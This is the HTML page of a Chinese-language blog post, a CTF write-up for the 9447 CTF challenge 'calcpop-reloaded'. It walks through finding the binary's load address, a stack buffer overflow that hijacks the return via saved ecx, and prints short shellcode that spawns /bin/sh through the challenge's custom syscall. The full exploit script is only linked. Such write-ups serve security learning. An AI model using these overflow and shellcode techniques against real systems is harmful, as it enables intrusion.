@@ -1,0 +1,292 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+<meta name="theme-color" content="#000000">
+<title>Writeup-9447 CTF: calcpop-reloaded &#8211; /home/cubarco</title>
+<meta name="description"
+  content="从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的） 这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣…），硬着头皮写篇 writeup 记录一下。 Load Address 找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到mov eax, 0x1007a7这类代码，大概可以猜出 load address 在 0x100000. 用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc. Overflow 接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。 这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用shutdown()之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。 接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化： ; entry: lea ecx, [esp-4] and esp, 0FFFFFFF0h...">
+
+<meta name="keywords" content="Hack, CTF, Writeup, Exploitation">
+
+
+<!-- Twitter Cards -->
+<meta name="twitter:title" content="Writeup-9447 CTF: calcpop-reloaded">
+<meta name="twitter:description"
+   content="从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的） 这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣…），硬着头皮写篇 writeup 记录一下。 Load Address 找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到mov eax, 0x1007a7这类代码，大概可以猜出 load address 在 0x100000. 用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc. Overflow 接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。 这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用shutdown()之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。 接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化： ; entry: lea ecx, [esp-4] and esp, 0FFFFFFF0h...">
+
+<meta name="twitter:site" content="@Cube_Lin">
+
+<meta name="twitter:creator" content="@Cube_Lin">
+
+<meta name="twitter:card" content="summary">
+<!--
+   -<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/images/">
+   -->
+
+<!-- Open Graph -->
+<meta property="og:locale" content="zh_CN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup-9447 CTF: calcpop-reloaded">
+<meta property="og:description"
+   content="从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的） 这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣…），硬着头皮写篇 writeup 记录一下。 Load Address 找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到mov eax, 0x1007a7这类代码，大概可以猜出 load address 在 0x100000. 用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc. Overflow 接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。 这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用shutdown()之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。 接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化： ; entry: lea ecx, [esp-4] and esp, 0FFFFFFF0h...">
+<meta property="og:url" content="https://cubl.in/blog/2015/12/9477-calcpop-reloaded-writeup/">
+<meta property="og:site_name" content="/home/cubarco">
+
+
+
+
+
+<link rel="canonical" href="https://cubl.in/blog/2015/12/9477-calcpop-reloaded-writeup/">
+<link href="https://cubl.in/feed.xml" type="application/atom+xml" rel="alternate" title="/home/cubarco Feed">
+
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/css/main.css">
+
+<!--Webfonts-->
+<link href='//fonts.googleapis.com/css?family=Volkhov|Cabin' rel='stylesheet' type='text/css' media="none" onload="if(media!='all')media='all'">
+<meta http-equiv="cleartype" content="on">
+
+<!-- Global settings -->
+<script>
+    window.ghmirror = "https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945"
+    window.searchEnabled = "true" ? true : false
+</script>
+
+<!-- Modernizr -->
+<script src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/modernizr-2.7.1.custom.min.js" async></script>
+
+</head>
+
+<body id="post">
+
+  <div class="navigation-wrapper">
+	<nav role="navigation" id="site-nav" class="animated drop">
+		<ul>
+			
+			
+			<li><a href="https://cubl.in/blog/" >Latest</a></li>
+			
+			
+			<li><a href="https://cubl.in/blog/about/" >About</a></li>
+			
+			
+			<li><a href="https://cubl.in/blog/archives/" >Archives</a></li>
+			
+			
+			<li><a href="https://cubl.in/blog/tags/" >Tags</a></li>
+			
+			<li class="dosearch"><span><i class="fa fa-search"></i> Search</span></li>
+		</ul>
+	</nav>
+</div><!-- /.navigation-wrapper -->
+
+<div class="search-wrapper">
+  <div class="search-form">
+    <input type="text" class="search-field" placeholder="Search...">
+    <button class="close-btn"><i class="fa fa-times-circle fa-2x"></i></button>
+    <ul class="search-results post-list"></ul><!-- /.search-results -->
+  </div><!-- /.search-form -->
+</div><!-- ./search-wrapper -->
+
+<div class="js-menu-screen menu-screen"></div>
+
+
+  <div id="main" role="main">
+    <article class="hentry">
+      
+      <div class="entry-wrapper">
+        <header class="entry-header">
+          <span class="entry-tags"><a href="https://cubl.in/blog/tags/#Hack"
+              title="Pages tagged Hack">Hack</a>&nbsp;&bull;&nbsp;<a href="https://cubl.in/blog/tags/#CTF"
+              title="Pages tagged CTF">CTF</a>&nbsp;&bull;&nbsp;<a href="https://cubl.in/blog/tags/#Writeup"
+              title="Pages tagged Writeup">Writeup</a>&nbsp;&bull;&nbsp;<a href="https://cubl.in/blog/tags/#Exploitation"
+              title="Pages tagged Exploitation">Exploitation</a></span>
+          
+          <h1 class="entry-title">Writeup-9447 CTF: calcpop-reloaded</h1>
+          
+        </header>
+        <footer class="entry-meta">
+          
+          
+          <span class="author vcard">By <span class="fn">Cubarco</span></span>
+          <span class="entry-date date published"><time datetime="2015-12-04T00:00:00+00:00"><i
+                class="fa fa-calendar-o"></i> December 04, 2015</time></span>
+          
+          <span class="entry-comments"><i
+              class="fa fa-comment-o"></i> <a href="#disqus_thread">Comment</a></span>
+          <span class="social-share-twitter">
+  <a href="https://twitter.com/intent/tweet?hashtags=Hack,CTF,Writeup,Exploitation&amp;text=Writeup-9447%20CTF:%20calcpop-reloaded&amp;url=https://cubl.in/blog/2015/12/9477-calcpop-reloaded-writeup/&amp;via=Cube_Lin"
+    title="Share on Twitter" itemprop="Twitter"><i class="fa fa-twitter-square"></i> Tweet</a>
+</span>
+<span class="social-share-facebook">
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https://cubl.in/blog/2015/12/9477-calcpop-reloaded-writeup/" title="Share on Facebook"
+    itemprop="Facebook"><i class="fa fa-facebook-square"></i> Like</a>
+</span>
+<!-- /.social-share -->
+          
+        </footer>
+        <div class="entry-content">
+          <p><em>从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的）</em></p>
+
+<p>这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣…），硬着头皮写篇 writeup 记录一下。</p>
+
+<h3 id="load-address">Load Address</h3>
+<p>找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到<code class="highlighter-rouge">mov eax, 0x1007a7</code>这类代码，大概可以猜出 load address 在 0x100000.</p>
+
+<p>用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc.</p>
+
+<h3 id="overflow">Overflow</h3>
+<p>接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。</p>
+
+<p>这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用<code class="highlighter-rouge">shutdown()</code>之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。</p>
+
+<p>接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化：</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="c1">; entry:</span>
+<span class="nf">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+<span class="nf">and</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0FFFFFFF0h</span>
+<span class="nf">push</span>    <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+<span class="nf">push</span>    <span class="nb">ebp</span>
+<span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nf">push</span>    <span class="nb">edi</span>
+<span class="nf">push</span>    <span class="nb">esi</span>
+<span class="nf">push</span>    <span class="nb">ebx</span>
+<span class="nf">push</span>    <span class="nb">ecx</span>
+
+<span class="c1">; exit:</span>
+<span class="nf">lea</span>     <span class="nb">esp</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">]</span>
+<span class="nf">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">pop</span>     <span class="nb">ecx</span>
+<span class="nf">pop</span>     <span class="nb">ebx</span>
+<span class="nf">pop</span>     <span class="nb">esi</span>
+<span class="nf">pop</span>     <span class="nb">edi</span>
+<span class="nf">pop</span>     <span class="nb">ebp</span>
+<span class="nf">lea</span>     <span class="nb">esp</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+<span class="nf">retn</span></code></pre></figure>
+
+<p>溢出到保存 ecx 的位置，使 ecx - 4 指向存有 shellcode 地址的栈位置，然后 ret 就能跳转到 shellcode.</p>
+
+<h3 id="shellcode">Shellcode</h3>
+<p>这题怎么写 shellcode 也是一个难点，因为系统是 9447 写的，不能直接用 execv 系统调用。所幸的是本题的系统调用功能都是能从一些字符串上看出来的。比如<code class="highlighter-rouge">read(%d %x %d)</code>, <code class="highlighter-rouge">write(%d %x %d)</code>之类。strings 一下可以看到<code class="highlighter-rouge">spawn(%x %x %d)</code>，我就猜测这个是类似 execv 的系统调用。可是参数不明确，特别是第三个参数。试了几次，发现用<code class="highlighter-rouge">spawn("/bin/sh", "/bin/sh", 1)</code>这样的参数是可以成功的，第三个参数 1 具体是什么含义，我也没搞明白。</p>
+
+<p>用 pwntool 生成的 shellcode 如下:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="c1">; push '/bin/sh\x00'</span>
+<span class="nf">push</span> <span class="mh">0x1010101</span>
+<span class="nf">xor</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="mh">0x169722e</span>
+<span class="nf">push</span> <span class="mh">0x6e69622f</span>
+<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">esp</span>
+
+<span class="nf">push</span> <span class="mh">0x1</span>
+<span class="nf">push</span> <span class="nb">edi</span>
+<span class="nf">push</span> <span class="nb">edi</span>
+<span class="nf">push</span> <span class="mh">0xdeadbeef</span>  <span class="c1">; junk</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">302125832</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x12121212</span>
+<span class="nf">call</span> <span class="nb">ebx</span>  <span class="c1">; spawn(%x, %x, %d)</span></code></pre></figure>
+
+<h3 id="exppy">exp.py</h3>
+
+<p>可以用 redos 中的 level1 本地调试。</p>
+
+<div class="gist" data-gist="cubarco/b4aee1ac22f1b3039d30"><p>Gist: <a href="https://gist.github.com/cubarco/b4aee1ac22f1b3039d30">cubarco/b4aee1ac22f1b3039d30</a></p></div>
+
+          <!--<div>
+            <span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/"><img
+                  alt="Creative Commons License" style="border-width:0"
+                  src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/images/cc_by-nc_88x31.png" /></a></span>
+          </div>-->
+          <nav class="pagination" role="navigation">
+            
+            <a href="https://cubl.in/blog/2015/11/9477-calcpop-writeup/" class="btn" title="Writeup-9447 CTF: calcpop">Previous</a>
+            
+            
+            <a href="https://cubl.in/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/" class="btn" title="Writeup-Seccon CTF: FSB:TreeWalker">Next</a>
+            
+          </nav><!-- /.pagination -->
+          <div id="disqus_thread"></div>
+          <!-- /#disqus_thread -->
+        </div><!-- /.entry-content -->
+      </div><!-- /.entry-wrapper -->
+
+    </article>
+  </div><!-- /#main -->
+
+  <div class="footer-wrapper">
+    <footer role="contentinfo" class="entry-wrapper">
+      
+
+<span>
+	Powered by <a href="https://jekyllrb.com">Jekyll</a>, <a href="https://github.com/features/actions">Github Actions</a>, <a href="https://www.jsdelivr.com">jsDelivr</a> and <a href="https://fly.io">Fly.io</a>.
+	<br />
+	© 2014 - 2021 ❤ Cubl
+</span>
+<div class="social-icons">
+	<a href="https://twitter.com/Cube_Lin"
+		title="Cubarco on Twitter" target="_blank"><i class="fa fa-twitter-square fa-2x"></i></a>
+	
+	
+	
+	
+	
+	
+	<a href="https://github.com/cubarco"
+		title="Cubarco on Github" target="_blank"><i class="fa fa-github-square fa-2x"></i></a>
+	
+	<a href="https://cubl.in/feed.xml" title="Atom/RSS feed"><i class="fa fa-rss-square fa-2x"></i></a>
+</div><!-- /.social-icons -->
+
+    </footer>
+  </div><!-- /.footer-wrapper -->
+
+  <!-- <script src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/jquery-2.1.4.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/gist-async.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/scripts.min.js"></script> -->
+<script src="https://cdn.jsdelivr.net/combine/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/jquery-2.1.4.min.js,gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/scripts.min.js" async></script>
+
+<!-- Check whether the page is a post -->
+
+
+<!-- Polyfill must be loaded before DisqusJS -->
+<!-- <script src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/polyfill.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/fetch.umd.min.js"></script>
+<script id="dsqjs-script" src="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/disqus.js"></script> -->
+<script>
+    window.disqus_shortname = 'cubarco';
+    window.disqus_siteName = '/home/cubarco';
+    window.disqus_api = 'https://cubl.in/disqus/';
+    window.disqus_apikey = [];
+    
+        window.disqus_apikey.push('Jw86RA4MHn7FOX9T3JdY2rdOwXIHztQXp1QGQzvEjil3rXPCOfIrn4yF53NEOcho');
+    
+        window.disqus_apikey.push('IDVVwMUDkvtvpwfL7KK9Yuqf0OHx0yCpEF3f3awBvWwg0RA2QMRSktMNiBOJs0am');
+    
+        window.disqus_apikey.push('ZOkyhwsK71f8GqNw5M9oCPEAyLXzA3IRqS76QXhJG29XvyjG3g7ocNoSA2PQCp1R');
+    
+    window.disqus_admin = 'cubarco';
+    window.disqus_adminLabel = 'Mod';
+</script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/css/vendor/disqusjs.css" media="none" onload="if(media!='all')media='all'">
+<script src="https://cdn.jsdelivr.net/combine/gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/polyfill.min.js,gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/fetch.umd.min.js,gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/disqus.js,gh/cubarco/cubarco.github.io@2021-0521-110947-14945/assets/js/vendor/disqus-settings.js" async></script>
+
+
+
+
+
+
+
+<script async defer data-website-id="e9fdcc32-0bfa-4de5-beb0-3bbf1e4638ab" src="https://umami.pwn.ooo/umami.js"></script>
+
+
+
+</body>
+
+</html>
